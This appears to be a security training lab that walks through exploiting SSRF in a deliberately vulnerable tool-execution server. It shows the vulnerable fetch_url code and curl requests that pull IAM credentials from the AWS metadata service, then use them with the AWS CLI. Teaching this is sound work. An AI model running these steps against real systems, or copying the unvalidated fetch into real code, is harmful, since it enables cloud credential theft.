# Lab 06: SSRF to AWS IMDS

## Objective

Exploit Server-Side Request Forgery (SSRF) to access AWS Instance Metadata Service (IMDS) and steal IAM credentials.

## Vulnerability Type

- **CWE-918** — Server-Side Request Forgery (SSRF)
- **Severity**: High

## Background

The `fetch_url` tool makes HTTP requests without URL validation. This allows:
1. Access to internal services (RFC1918 ranges)
2. Access to AWS IMDS (169.254.169.254)
3. Exfiltration of credentials and secrets

### Vulnerable Code

**File**: `server/src/tools.py:fetch_url_tool()`

```python
def fetch_url_tool(url: str) -> dict:
    """
    VULN: No URL validation or allowlist.
    Allows access to AWS IMDS, internal services, etc.
    """
    response = requests.get(url, timeout=10)  # No validation!
    return {
        "status": "success",
        "url": url,
        "content": response.text
    }
```

## Lab Exercise

### Scenario

In an EKS environment with IMDSv1 enabled (default), you can steal node IAM credentials using SSRF.

### Attack Steps

1. **Query IMDS for IAM role name**

```bash
curl http://localhost:8000/tools/execute \
  -H "Content-Type: application/json" \
  -d '{
    "tool": "fetch_url",
    "input": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  }'
```

Expected response:
```
node-role-1a2b3c
```

2. **Fetch credentials for that role**

```bash
curl http://localhost:8000/tools/execute \
  -H "Content-Type: application/json" \
  -d '{
    "tool": "fetch_url",
    "input": "http://169.254.169.254/latest/meta-data/iam/security-credentials/node-role-1a2b3c"
  }'
```

Expected response:
```json
{
  "AccessKeyId": "AKIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}
```

3. **Use stolen credentials**

```bash
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Now you can access AWS resources as the node
aws s3 ls
aws ec2 describe-instances
```

## References

- [CWE-918: SSRF](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP: SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [AWS: IMDSv2 Security](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
